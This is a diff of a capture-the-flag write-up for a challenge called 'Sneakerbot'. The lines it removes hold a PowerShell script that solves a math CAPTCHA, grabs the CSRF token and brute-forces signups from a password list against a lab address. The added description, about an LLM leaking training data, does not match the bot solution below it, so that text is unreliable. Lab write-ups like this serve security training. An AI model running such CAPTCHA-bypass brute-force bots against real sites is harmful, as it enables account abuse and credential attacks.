@@ -34,7 +34,17 @@ what is the clearewb domain of the deceased conti ransomware gang with the two-l
 :+1: FLAG{you-are-now-an-apt-connoisseur}
 <hr>
 
-SNEAKERBOT
+### Sneakerbot
+Description - I recently started building my own LLM... I am not sure what I'm doing yet, but I managed to get some sort of next-token prediction algorithm working with only one word using some data from Wikipedia pages. I've heard all about security concerns on leaking training data, so for testing, I've hidden a flag in the training data to see if you can find it.
+
+Flag Format: FLAG{your_example_flag_goes_here}
+
+After checking out the site, there was no clear indication that a registration was successful as it would just return to the login screen.
+It it failed however, an error message would appear "Recaptcha answer is wrong or missing"
+This was good because all I had to do was ensure that the recaptcha was accurate.
+
+For this, the following code rendered the flag in wireshark
+
 ```
 import requests
 import json
@@ -147,109 +157,8 @@ for _ in range(100):
             print("[-] Registration failed. HTTP status code:", response.status_code)
             count += 1
 ```
-POWERSHELL CODE FOR SNEAKER
-```
-$username = "admin"
-$passwords = Get-Content "passwords.txt"
-$websiteUrl = "http://10.107.0.6/signup.php"
-$signupUrl = "http://10.107.0.6/signup.php"
-$operatorMap = @{
-    "plus" = "+"
-    "minus" = "-"
-    "multiplied by" = "*"
-    "divided by" = "/"
-}
-
-# Repeat the process for 100 times
-for ($i = 0; $i -lt 100; $i++) {
-    $accessGranted = $false
-    $count = 0
-
-    while (-not $accessGranted -and $count -lt $passwords.Count) {
-        $password = $passwords[$count]
-
-        # Connect to the signup page
-        Write-Host "[*] Connecting to signup page..."
-        $response = Invoke-WebRequest -Uri $websiteUrl -SessionVariable session
-        Write-Host "[+] Connected to signup page successfully."
-
-        # Parse the HTML and find the CAPTCHA question and CSRF token
-        Write-Host "[*] Parsing HTML..."
-        $soup = New-Object -ComObject "HTMLFile"
-        $soup.IHTMLDocument2_write($response.Content)
-        $recaptchaQuestionElement = $soup.getElementsByTagName("p") | Where-Object { $_.innerText -match "Recaptcha question:" }
-        $csrfTokenInput = $soup.getElementsByName("csrftoken")
-        if ($recaptchaQuestionElement -and $csrfTokenInput) {
-            $questionText = $recaptchaQuestionElement.innerText -replace "Recaptcha question:", "" -replace "`n", ""
-            $csrfToken = $csrfTokenInput.value
-            Write-Host "[+] CAPTCHA question found: $questionText"
-            Write-Host "[+] CSRF token found: $csrfToken"
-        } else {
-            Write-Host "[-] CAPTCHA question or CSRF token not found."
-            continue
-        }
-
-        # Extract the math question
-        $mathQuestion = $questionText -replace "What is (.+)\?", '$1'
-        Write-Host "[+] Math question found: $mathQuestion"
-
-        # Extract the operator from the math question
-        $operator = $null
-        foreach ($opText in $operatorMap.Keys) {
-            if ($mathQuestion -match $opText) {
-                $operator = $operatorMap[$opText]
-                break
-            }
-        }
-
-        if (-not $operator) {
-            Write-Host "[-] Operator not found in the math question."
-            continue
-        }
-
-        # Extract operands
-        $operands = [regex]::Matches($mathQuestion, "\d+").Value
-        Write-Host "[+] Extracted operands: $operands"
-        Write-Host "[+] Operator found: $operator"
-
-        # Calculate the result of the math question
-        $operand1 = [int]$operands[0]
-        $operand2 = [int]$operands[1]
-        switch ($operator) {
-            "+" { $captchaAnswer = $operand1 + $operand2 }
-            "-" { $captchaAnswer = $operand1 - $operand2 }
-            "*" { $captchaAnswer = $operand1 * $operand2 }
-            "/" { $captchaAnswer = $operand1 / $operand2 }
-        }
-        Write-Host "[+] Calculated captcha answer: $captchaAnswer"
-
-        # Build the POST data for our brute force attempt
-        $signupData = @{
-            'username' = $username
-            'password' = $password
-            'recaptcha' = $captchaAnswer
-            'csrftoken' = $csrfToken
-            'Confirm' = "Submit"
-        }
-
-        Write-Host "[*] Attempting signup with credentials:"
-        $signupData | Format-List
-
-        # Submit our brute force attack
-        $response = Invoke-WebRequest -Uri $signupUrl -Method Post -Body $signupData -WebSession $session
-
-        # Check the HTTP response code
-        if ($response.StatusCode -eq 200) {
-            Write-Host "[+] Registration successful for Username: $username"
-            $accessGranted = $true
-        } else {
-            Write-Host "[-] Registration failed. HTTP status code: $($response.StatusCode)"
-            $count++
-        }
-    }
-}
-
-```
+:+1: FLAG{unl34sh-the-b0ts}
+<hr>
 
 LARGE FLAG MODEL CODE
 ```
